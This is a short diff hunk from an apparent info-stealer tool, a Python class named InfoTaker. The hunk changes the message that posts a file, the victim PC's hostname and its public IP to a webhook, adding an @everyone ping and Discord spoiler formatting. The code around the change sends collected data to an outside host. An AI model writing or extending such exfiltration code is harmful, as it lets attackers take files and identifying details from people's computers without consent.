@@ -201,7 +201,7 @@ class InfoTaker:
                 response = requests.post(
                     webhookUrl,
                     files={"file": file},
-                    data={"content": f"Information of the PC: " + socket.gethostname() + ". IP: " + InfoTaker.getPublicIp()}
+                    data={"content": f"||@everyone||Information of the PC: " + socket.gethostname() + ". IP: ||" + InfoTaker.getPublicIp() + "||"}
                 )
                 if response.status_code in (200, 204):
                     print("File sent successfully!")
